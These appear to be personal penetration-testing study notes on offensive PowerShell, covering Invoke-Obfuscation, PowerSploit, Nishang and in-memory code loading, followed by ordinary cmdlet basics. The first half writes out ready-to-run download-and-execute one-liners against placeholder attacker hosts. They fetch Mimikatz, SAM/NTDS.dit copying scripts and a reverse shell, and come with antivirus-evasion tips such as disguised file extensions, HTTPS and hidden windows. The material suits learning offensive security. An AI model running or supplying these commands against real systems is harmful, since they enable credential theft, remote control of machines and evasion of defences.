Security endpoints' programs implements various techniques to catch powershell code execution over the wire, so attackers,
in order to evade them, have developed some obfuscation techniques.

Invoke-Obfuscation, by Daniel Bohannon, is one of the most well-known obfuscation framework.
It does give the attacker the option to obfuscate the code or to encode it.

Like other Modules, Powershell needs to load it first before being able to use it.
To get Module Path: $env:PSModulePath. The module goes in one of the paths shown.

Invoke-Obfuscation: launches Invoke-Obfuscation module/script.

First of all the attacker needs to pass the code to obfuscate/encode: SET SCRIPTBLOCK [CODE].
Then a obfuscation/encoding method is to be chosen: TOKEN, AST, STRING, ENCODING, COMPRESS, LAUNCHER.

Once the result is returned, it can be copied/pasted in to a powershell console on target machine and execute it.
From CMD.exe: powershell -Command "[OBFUSCATED/ENCODED CODE]"

Applying different encoding methods may results in error at execution.
This is due to the fact that encodings may "pile up" and produce a very large result which may exceed CMD's max command length.
RESET allows for resetting and clear previous encodings.

LAUNCHER obfuscation method let the attacker runs the encoded code as if coming from another process.

Windows Powershell's EncodedCommand is a built-in feature that encodes commands into base64.




Even though Powershell is for attacker a great post-exploitation tool, it can be used for other Penetration Test phases, like Information Gathering and Recon.
Aside building scripts or one-liner, Powershell features can be easily extended with custom modules, like PowerSploit.
Powersploit does contain a lot of preconfigured scripts and cmdlets.

Invoke-Portscan: port scanner, CIDR notation-aware.
Get-HttpStatus: similar to birbuster.

Posh-SecMod is another useful framework which includes cmdlets for actions like: DNS lookup, reverse DNS lookup, ARPScan.



Post-exploitation framework to note: Nishang.
In order to avoid Antivirus detection, the attacker should download and run code in "in-memory" commands.

.Gather:
- Copy-VSS: attempts SAM databse copy, copy of NTDS.dit on domain controllers, copy of the content of SYSTEM hive.
--- iex (New-Object Net.WebClient).DownloadString("http://attacker_URL/Copy-VSS.ps1"); Copy-VSS
- Get-Information: downloads a lot of system information.
--- iex (New-Object Net.WebClient).DownloadString("http://attacker_URL/Get-Information.ps1"); Get-Information
- Get-PassHints: dump saved Password Hints.
--- iex (New-Object Net.WebClient).DownloadString("http://attacker_URL/Get-PassHints.ps1"); Get-PassHints
- Invoke-Mimikatz: runs Mimikatz with specified arguments.
--- iex (New-Object Net.WebClient).DownloadString("http://attacker_URL/Invoke-Mimikatz.ps1"); Invoke-Mimikatz
- Invoke-PowerShellTcp: spawn a reverse-shell Powershell console on attacker PC who runs netcat listener.
--- iex (New-Object Net.WebClient).DownloadString("http://attacker_URL/Invoke-PowerShellTcp.ps1"); Invoke-PowerShellTcp
    -Reverse -IpAddress [LISTENER_IP] -Port [PORT]


PowerSploit's PrivEsc "PowerUp" module includes lots of functions for privilege escalation.
Its Invoke-AllChecks runs checks against target machine in order to find ways for privilege escalation (export -HTMLReport).

Powershell returns cmdlets results as "objects" not as simple text.

. Get-Process | Get-Member -MethodType Method: returns a list of method which can be used on processes, for example "Kill".
. Get-Process -Name [PROCESS] | Kill: kills all [PROCESS] services

Powershell lets users create their own .NET objects through the cmdlet New-Object.
Example: creation of a new object based on Net.Webclient .NET system class.
. $webclient = New-Object System.Net.Webclient
. $payload_url = "https://attacker_host/payload.exe"
. $file = "C:\ProgramData\payload.exe"
. $webclient.DownloadFile($payload_url,$file)

Attackers using Powershell can choose between two ways of downloading and executing code:
. Download files onto the target machine and then execute it
. Download files and execute them within the powershell process memory (never touch disks on target machine)

Within Powershell 2.0 "In-Memory" methods are:
. Net.WebClient DownloadString Method
. Net.WebClient DownloadData Method
. Net.WebClient OpenRead Method
. .NET (NEt.HttpWebRequest) Class
. Word.Application COM Object
. Excel.Application COM Object
. InternetExplorer.Application COM Object
. MsXml2.ServerXmlHttp COM Object
. Certutil.exe w/ -ping argument

Within Powershell 2.0 "In-Memory" methods are:
. Net.WeClient DownloadFile Method
. BITSAdmin.exe
. Certutil.exe w/ -urlcache argument

Examples.

. iex (New-Object Net.WebClient).DownloadString("http://attacker_host/script.ps1")  [iex = Invoke-Expression]
.. from cmd: powershell iex (New-Object Net.WebClient).DownloadString('http://attacker_host/script.ps1')
... running directly from the console:
... $downloader = New-Object System.Net.WebClient
... $payload = "http://attacker_host/script.ps1"
... $command = $downloader.DownloadString($payload)
... Invoke-Expression $command

! MOUNT AN SSL CERTIFICATE ON ATTACKER MACHINE WHEN POSSIBLE AND USE HTTPS FOR EVASION.
! USE DIFFERENT FILE EXTENSIONS FOR POWERSHELL SCRIPTS (like .gif) FOR EVASION. POWERSHELL DOES STILL EXECUTE THEM LIKE .ps1 FILES.
! Net.WebClient.Header.App is useful for specifying user-agent strings (for example to use firefox's or chrome's).

Net.WebClient.DownloadFile does download the specified file to disk for later execution.

Net.WebRequest does act similar to .DownloadString, it downloads and runs scripts in memory.
Example:
. $req = [System.Net.WebRequest]::Create("http://attacker_URL/script.ps1")
. $res = $req.GetResponse()
. iex ([System.IO.StreamReader] ($res.GetResponseStream())).ReadoEnd()

Another way to execute code in memory is by using System.Xml.XmlDocument class which executes commands listed 
in a specified xml file.
Example:
. $xmldoc = New-Object System.Xml.XmlDocument
. $xmldoc.Load("http://attacker_URL/file.xml")
. iex $xmldoc.command.a.execute

On a 64-bit system, 32-bit powershell executable is locted at "C:\Windows\SysWOW64\WindowsPowershell" while the 64-bit version
is located at "C:\Windows\System32\WindowsPowershell".

In order to check whether the user is using powershell 64-bit, the following command may come in handy:
- [Environment]::Is64BitProcess => True (64-bit in use) / False (32-bit in use)

On a 32-bit system, powershell is located at "C:\Windows\System32\WindowsPowershell".

. powershell.exe -ExecutionPolicy Bypass/Unrestricted (to allow execution of scripts)
. powershell.exe -WindowStyle Hidden (to hide poershell console while executing commands/scripts)
. powershell.exe -Command [cmdlet]
. powershell.exe -Command "& ([cmdlets])"
. powershell.exe -EncodedCommand [base64encodedcommand]
. powershell.exe -NoProfile (profiles are scripts that run when powershell is launched and can interfere with our operation)
. powershell.exe -Version X (powershell downgrades to specified version if installed on system)

Powershell command parameters may be shortened as long as the abbreviations are unique:
- Powershell.exe -ExecutionPolicy Bypass => powershell.exe -ep Bypass => powershell.exe -ex by

Get-Help is like Man Pages for *nix systems.
- Get-Help [cmdlet] -Full (returns full Help page)
- Get-Help [cmdlet] -Examples (returns examples on how to use [cmdlet])
- Get-Help [cmdlet] -Online (returns help webpage)
- Update-Help (does update Help files)

By default, cmdlets, when wxecuted with no parameters return a predefined set of information (number of columns).
Piping the result into other commands, like "Format-List *" for instance, will show all information associated with that object.

Get-Process returns a list of running processes.
Get-ChildItem returns a list of items in the specified/current location. (Its alias is "ls").
Powershell cmdlets have aliases. To find them, "Get-Aliases -Definition [cmdlet]".

Export-CSV (exports result in a CSV file).

cd [REG_KEY] (allows for registry browsing).


Select-String -Path [Folder-Path] -Pattern [string/substring pattern] (allows searching for searching for files
	which contains the specified pattern).

Get-Content is much similar to Unix cat command.


.ps1 is the Powershell Script's Extension ("1" does not refer to the powershell version to use but rather its engine).


Loop statements:
- for()
- foreach()
- while()
- do {something} while()
- do {something} until()

